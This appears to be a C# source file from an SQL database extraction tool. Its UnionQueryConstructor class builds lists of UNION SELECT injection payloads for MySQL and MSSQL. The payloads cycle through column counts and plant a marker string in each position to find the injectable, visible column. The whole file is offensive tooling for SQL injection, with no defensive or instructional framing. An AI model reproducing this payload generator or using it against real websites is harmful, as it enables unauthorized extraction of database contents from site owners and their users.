using System;
using System.Collections.Generic;
using System.Text;

namespace Sql_Database_Extraction
{
    public class UnionQueryConstructor
    {

        private List<string> FinalUnionQueries;

        public UnionQueryConstructor()
        {
            FinalUnionQueries = new List<string>();
        }

        public List<string> createQueries(int MinValue, int MaxValue, eDataBase DataBaseType)
        {
            if (MinValue < MaxValue)
            {
                for (int x = MinValue; x < MaxValue; x++)
                {
                    string[] Basis = new string[x];

                    for (int y = 0; y < Basis.Length; y++)
                    {
                        Basis[y] = "NULL,";
                    }

                    if (DataBaseType == eDataBase.MSSQL)
                        unionQueryMSSQL(Basis);
                    else
                        unionQueryMySQL(Basis);
                }
            }
            return FinalUnionQueries;
        }

        private void unionQueryMySQL(string[] Basis)
        {
            Random zahl = new Random();

            for (int z = 0; z < Basis.Length; z++)
            {
                int a = 12;
                int b = 34;
                int c = 4321;

                Basis[z] = "CONCAT(0x5f5f5f6c6c," + a + "," + b.ToString() + c.ToString() + ",0x6c6c5f5f5f),";
                ZusammensetzenMySQL(Basis);
                Basis[z] = "NULL,";
            }
        }

        private void unionQueryMSSQL(string[] Basis)
        {
            Random zahl = new Random();

            for (int y = 0; y < Basis.Length; y++)
            {
                int a = 1234;
                int b = 4321;

                Basis[y] = "Char(95)+Char(95)+Char(95)+Char(108)+Char(108)+CAST(" + a.ToString() + b.ToString() + " as varchar)+Char(108)+Char(108)+Char(95)+Char(95)+Char(95),";
                ZusammenSetzenMSSQL(Basis);
                Basis[y] = "NULL,";
            }
        }

        private void ZusammensetzenMySQL(string[] Basis)
        {
            string query = string.Empty;
            foreach (string element in Basis)
            {
                query = query + element;
            }
            FinalUnionQueries.Add("LIMIT 0 UNION SELECT " + query.Remove(query.LastIndexOf(",")));
        }

        private void ZusammenSetzenMSSQL(string[] Basis)
        {
            string query = string.Empty;
            foreach (string element in Basis)
            {
                query = query + element;
            }
            FinalUnionQueries.Add("UNION ALL SELECT " + query.Remove(query.LastIndexOf(",")));
        }
    }
}
